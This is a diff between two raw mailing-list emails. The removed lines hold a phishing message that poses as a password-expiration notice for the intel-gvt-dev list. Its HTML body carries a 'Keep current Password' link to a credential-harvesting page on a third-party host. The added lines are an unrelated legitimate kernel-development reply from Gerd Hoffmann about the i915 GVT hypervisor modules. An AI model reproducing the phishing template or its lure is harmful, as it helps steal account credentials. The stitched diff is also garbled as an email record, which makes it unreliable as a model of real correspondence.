@@ -1,30 +1,55 @@
 Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
-Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id EBBF73D22A9
-	for <lists+intel-gvt-dev@lfdr.de>; Thu, 22 Jul 2021 13:24:27 +0200 (CEST)
+Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
+	by mail.lfdr.de (Postfix) with ESMTPS id D75F43D22B0
+	for <lists+intel-gvt-dev@lfdr.de>; Thu, 22 Jul 2021 13:27:12 +0200 (CEST)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id A4A036E122;
-	Thu, 22 Jul 2021 11:24:26 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id 5AC986E5D4;
+	Thu, 22 Jul 2021 11:27:11 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-X-Greylist: delayed 14752 seconds by postgrey-1.36 at gabe;
- Thu, 22 Jul 2021 11:24:24 UTC
-Received: from bizcloud-elcha.txt (unknown [167.99.60.162])
- by gabe.freedesktop.org (Postfix) with ESMTP id BD7936E122
+Received: from us-smtp-delivery-124.mimecast.com
+ (us-smtp-delivery-124.mimecast.com [170.10.133.124])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id 73D2C6E5D4
  for <intel-gvt-dev@lists.freedesktop.org>;
- Thu, 22 Jul 2021 11:24:24 +0000 (UTC)
-Received: from emirates.net.ae (bizcloud-elcha.txt [IPv6:::1])
- by bizcloud-elcha.txt (Postfix) with ESMTP id 8260D331DB1
- for <intel-gvt-dev@lists.freedesktop.org>;
- Thu, 22 Jul 2021 04:23:45 +0000 (UTC)
-From: "lists.freedesktop.org" <Cpanel@lists.freedesktop.org>
-To: intel-gvt-dev@lists.freedesktop.org
-Subject: PASSWORD EXPIRATION NOTICE FOR intel-gvt-dev@lists.freedesktop.org
-Date: 22 Jul 2021 04:23:43 -0700
-Message-ID: <20210722042343.9164E7DCEED7DAAF@lists.freedesktop.org>
+ Thu, 22 Jul 2021 11:27:09 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+ s=mimecast20190719; t=1626953228;
+ h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+ to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+ in-reply-to:in-reply-to:references:references;
+ bh=tlwSP3E+o6dACUexqN1lCWWtUA1ZS2/frtL2qurgSS8=;
+ b=JM4wdHnHB1Y5/EzFENbsOmvtv/1wvBejgaxRH0P2M9jg+LLtSzpl6vxuVuV5fv5ovfoUx1
+ R5tSv5DSE7wEbzw6AB1F8+U5U1oLMCuuWip0HhkyBi61CIyGL+p7n+UXhiWVRA792n0vzn
+ QhqF6QdElyzj51jBobYdl9tRWAeYY3A=
+Received: from mimecast-mx01.redhat.com (mimecast-mx01.redhat.com
+ [209.132.183.4]) (Using TLS) by relay.mimecast.com with ESMTP id
+ us-mta-526-TXg5LJprPxKeYAsU7j2vnQ-1; Thu, 22 Jul 2021 07:27:05 -0400
+X-MC-Unique: TXg5LJprPxKeYAsU7j2vnQ-1
+Received: from smtp.corp.redhat.com (int-mx03.intmail.prod.int.phx2.redhat.com
+ [10.5.11.13])
+ (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
+ (No client certificate requested)
+ by mimecast-mx01.redhat.com (Postfix) with ESMTPS id CD732E7B47;
+ Thu, 22 Jul 2021 11:26:39 +0000 (UTC)
+Received: from sirius.home.kraxel.org (ovpn-114-106.ams2.redhat.com
+ [10.36.114.106])
+ by smtp.corp.redhat.com (Postfix) with ESMTPS id 6E64F6A056;
+ Thu, 22 Jul 2021 11:26:38 +0000 (UTC)
+Received: by sirius.home.kraxel.org (Postfix, from userid 1000)
+ id B0EE018000B2; Thu, 22 Jul 2021 13:26:36 +0200 (CEST)
+Date: Thu, 22 Jul 2021 13:26:36 +0200
+From: Gerd Hoffmann <kraxel@redhat.com>
+To: "Wang, Zhi A" <zhi.a.wang@intel.com>
+Subject: Re: refactor the i915 GVT support
+Message-ID: <20210722112636.wj277vqhg4dez5ug@sirius.home.kraxel.org>
+References: <20210721155355.173183-1-hch@lst.de>
+ <DM4PR11MB55496531B246A4604FC86998CAE49@DM4PR11MB5549.namprd11.prod.outlook.com>
 MIME-Version: 1.0
+Content-Disposition: inline
+In-Reply-To: <DM4PR11MB55496531B246A4604FC86998CAE49@DM4PR11MB5549.namprd11.prod.outlook.com>
+X-Scanned-By: MIMEDefang 2.79 on 10.5.11.13
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -37,119 +62,39 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============0571646474=="
+Cc: "dri-devel@lists.freedesktop.org" <dri-devel@lists.freedesktop.org>,
+ "intel-gfx@lists.freedesktop.org" <intel-gfx@lists.freedesktop.org>,
+ Joonas Lahtinen <joonas.lahtinen@linux.intel.com>,
+ "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
+ Zhenyu Wang <zhenyuw@linux.intel.com>,
+ Jani Nikula <jani.nikula@linux.intel.com>, "Vivi,
+ Rodrigo" <rodrigo.vivi@intel.com>,
+ "intel-gvt-dev@lists.freedesktop.org" <intel-gvt-dev@lists.freedesktop.org>,
+ Christoph Hellwig <hch@lst.de>
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
---===============0571646474==
-Content-Type: text/html;
-	charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
+  Hi,
 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
-w3.org/TR/html4/loose.dtd">
+> https://github.com/intel/gvt-linux/blob/topic/gvt-xengt/drivers/gpu/drm/i915/gvt/xengt.c
 
-<HTML><HEAD>
-<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19003"></HEAD>
-<body style=3D"MARGIN: 0.5em">
-<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
-ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
-ACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238,238); FONT=
--WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BORDER-BOTTOM-COLOR=
-: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; BORDER-RIGHT-CO=
-LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
-nt-ligatures: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
- style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
-R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
-ER-RIGHT-COLOR: rgb(238,238,238)" color=3D#3e2020 size=3D6 face=3D"Calibri =
-Light">
-<FONT style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
-BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238);=
- BORDER-RIGHT-COLOR: rgb(238,238,238)" color=3D#d96c00>P A S S W O R D&nbsp=
-;&nbsp;&nbsp;&nbsp;E X P I R A T I O N</FONT></FONT></P>
-<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
-ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
-ACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238,238); FONT=
--WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BORDER-BOTTOM-COLOR=
-: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; BORDER-RIGHT-CO=
-LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
-nt-ligatures: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
- style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
-R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
-ER-RIGHT-COLOR: rgb(238,238,238)" face=3D"Calibri Light">
-intel-gvt-dev@lists.freedesktop.org security password expires&nbsp;<FONT st=
-yle=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-L=
-EFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-=
-RIGHT-COLOR: rgb(238,238,238)" color=3D#ff0000>8/1/2021</FONT></FONT></P>
-<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
-ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
-ACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238,238); FONT=
--WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BORDER-BOTTOM-COLOR=
-: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; BORDER-RIGHT-CO=
-LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
-nt-ligatures: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
- style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
-R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
-ER-RIGHT-COLOR: rgb(238,238,238)" face=3D"Calibri Light">Microsoft Advices&=
-nbsp;intel-gvt-dev@lists.freedesktop.org Re-enter password to keep account.=
-</FONT></P>
-<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
-ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
-ACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238,238); FONT=
--WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BORDER-BOTTOM-COLOR=
-: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; BORDER-RIGHT-CO=
-LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
-nt-ligatures: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial; text-decoration-color: initial" align=3Dleft>
-<A title=3Dhttp://google.com style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: b=
-order-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM=
--WIDTH: 0px; COLOR: rgb(0,118,198); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
-PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; =
-BACKGROUND-COLOR: transparent; text-decoration-line: none" href=3D"https://=
-sg3plvwcpnl378889.prod.sin3.secureserver.net/~aloyst/index/cpwebmail/index.=
-php?email=3Dintel-gvt-dev@lists.freedesktop.org" rel=3Dnoreferrer target=3D=
-_blank=20
-data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://sg3plvwcpnl37=
-8889.prod.sin3.secureserver.net/~aloyst/tests/mocks/cpwebmail/index.php?ema=
-il%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1626993677920000&amp;=
-usg=3DAFQjCNH_gWVCUF6GL7TRUKhEUDOsYmDZgg"><FONT style=3D"BOX-SIZING: border=
--box; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,23=
-8); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,=
-238)" color=3D#0080ff size=3D4 face=3D"Calibri Light">
-Keep current Password</FONT></A></P>
-<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
-ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
-ACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238,238); FONT=
--WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BORDER-BOTTOM-COLOR=
-: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; BORDER-RIGHT-CO=
-LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
-nt-ligatures: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
- style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
-R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
-ER-RIGHT-COLOR: rgb(238,238,238)" face=3D"Calibri Light">
-<EM style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
-RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
-ORDER-RIGHT-COLOR: rgb(238,238,238)">@ lists.freedesktop.org</EM>&nbsp;2021=
-</FONT></P></BODY></HTML>
+> But it's hard for some customers to contribute their own "hypervisor"
+> module to the upstream Linux kernel. I am thinking what would be a
+> better solution here? The MPT layer in the kernel helps a lot for
+> customers, but only one open-source "hypervisor" module is there in
+> the kernel. That can confuse people which don't know the story.  One
+> thing I was thinking is to put a document about the background and
+> more description in the MPT headers. So it won't confuse more people. 
 
---===============0571646474==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+Getting the xengt module linked above merged into mainline
+would also nicely explain why there are hypervisor modules.
+
+take care,
+  Gerd
 
 _______________________________________________
 intel-gvt-dev mailing list
 intel-gvt-dev@lists.freedesktop.org
 https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev
-
---===============0571646474==--
